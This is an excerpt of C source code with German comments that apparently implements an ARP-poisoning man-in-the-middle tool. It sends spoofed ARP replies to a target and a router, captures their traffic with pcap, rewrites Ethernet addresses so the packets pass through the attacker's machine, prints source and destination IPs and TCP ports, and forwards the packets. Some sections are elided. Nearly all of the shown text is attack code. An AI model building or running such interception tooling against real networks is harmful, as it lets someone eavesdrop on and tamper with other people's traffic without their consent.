...
void mod_mitm_package(const u_char *packet_data, const char *router_ip, const char *target_ip, const unsigned char *router_mac, const unsigned char *target_mac, const unsigned char *local_mac){
    ...
    inet_ntop(AF_INET, &(ip_header->saddr), src_ip_string, INET_ADDRSTRLEN);
    inet_ntop(AF_INET, &(ip_header->daddr), dst_ip_string, INET_ADDRSTRLEN);

    if (strcmp(src_ip_string, router_ip) == 0 && strcmp(dst_ip_string, target_ip) == 0) {
        // Paket vom Router zum Ziel, deine MAC ist die Quelle
        memcpy(eth_header->h_dest, target_mac, ETH_ALEN);
        memcpy(eth_header->h_source, local_mac, ETH_ALEN);
    } else if (strcmp(src_ip_string, target_ip) == 0 && strcmp(dst_ip_string, router_ip) == 0) {
        // Paket vom Ziel zum Router, deine MAC ist die Quelle
        memcpy(eth_header->h_dest, router_mac, ETH_ALEN);
        memcpy(eth_header->h_source, local_mac, ETH_ALEN);
    }
...
void package_handler(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u_char *packet_data) {
    handler_data_t *h_data = (handler_data_t *)user_data;

    // Wir brauchen eine kopierbare Version des Pakets, da pcap_next_ex() 'const' Daten liefert
    u_char *modified_packet = (u_char *)malloc(pkthdr->len);
    if (modified_packet == NULL) {
        perror("malloc");
        return;
    }
    memcpy(modified_packet, packet_data, pkthdr->len);
    
    // Rufe mod_mitm_package mit den korrekten Daten auf
    mod_mitm_package(modified_packet, h_data->router_ip_str, h_data->target_ip_str, h_data->router_mac, h_data->target_mac, h_data->local_mac);
    
    struct sockaddr_ll sa_ll;
    memset(&sa_ll, 0, sizeof(sa_ll));
    sa_ll.sll_family = AF_PACKET;
    sa_ll.sll_protocol = htons(ETH_P_ALL); // Das Protokoll für den Socket
    sa_ll.sll_halen = ETH_ALEN;
    sa_ll.sll_ifindex = h_data->if_index;

    // Die Ziel-MAC-Adresse, die bereits im modifizierten Paket-Header steht.
    struct ethhdr *eth_header = (struct ethhdr *)modified_packet;
    memcpy(sa_ll.sll_addr, eth_header->h_dest, ETH_ALEN);

    // Package console ouput
    if (ntohs(((struct ethhdr *)packet_data)->h_proto) == ETH_P_IP) {
        struct iphdr *ip_header = (struct iphdr *)(packet_data + ETH_HLEN);
        ...
        printf("--- Gekapseltes IP-Paket ---\n");
        printf("Source IP: %s\n", src_ip);
        printf("Destination IP: %s\n", dst_ip);
        printf("Länge des Pakets: %d bytes\n", pkthdr->len);
        
        // Prüfe, ob das Paket nach der Änderung größer ist
        printf("Länge nach Modifikation: %d bytes\n", pkthdr->len);
        
        // Versuche, den Fehler zu finden
        if (pkthdr->len > 1500) { // Die typische MTU für Ethernet
            printf("WARNUNG: Paket ist größer als die typische MTU (1500).\n");
        }
        
        // Wenn es ein TCP-Paket ist, zeige die Ports
        if (ip_header->protocol == IPPROTO_TCP) {
            struct tcphdr *tcp_header = (struct tcphdr *)(packet_data + ETH_HLEN + (ip_header->ihl * 4));
            printf("Protokoll: TCP\n");
            printf("Source Port: %d\n", ntohs(tcp_header->source));
            printf("Destination Port: %d\n", ntohs(tcp_header->dest));
        } else {
            printf("Protokoll: %d (nicht TCP)\n", ip_header->protocol);
        }
        printf("------------------------------\n\n");
    }

    // Sende das modifizierte Paket
    if (sendto(h_data->raw_sockfd, modified_packet, pkthdr->len, 0, (struct sockaddr*)&sa_ll, sizeof(sa_ll)) == -1) {
        perror("sendto");
    }
...
int main(int argc, char *argv[])
{
 if (argc != 5) { // Jetzt exakt 5 Argumente (Programmname + 4 Parameter)
    ...
    if(forward_sockfd == -1){
        perror("forward_sockfd creation");
        return 1;
    }
    printf("Forward-Socket für ARP-Pakete erstellt.\n");
    ...
    handler_data_t h_data;
    h_data.raw_sockfd = forward_sockfd;
    h_data.if_index = if_index;
    h_data.router_ip_str = spoof_ip_str;
    h_data.target_ip_str = target_ip_str;
    h_data.local_mac = local_mac;
    h_data.router_mac = target_2_mac_bytes;
    h_data.target_mac = target_mac_bytes;
    
    printf("[INFO] starting ARP-poisoning and package-forwarding...\n");
    
    send_arp_package(raw_sockfd, &arp_p, if_index, target_mac_bytes);
    send_arp_package(raw_sockfd, &arp_p2, if_index, target_2_mac_bytes);

    if (pcap_loop(handle, -1, package_handler, (u_char *)&h_data) < 0) {
        fprintf(stderr, "Fehler in pcap_loop: %s\n", pcap_geterr(handle));
    }
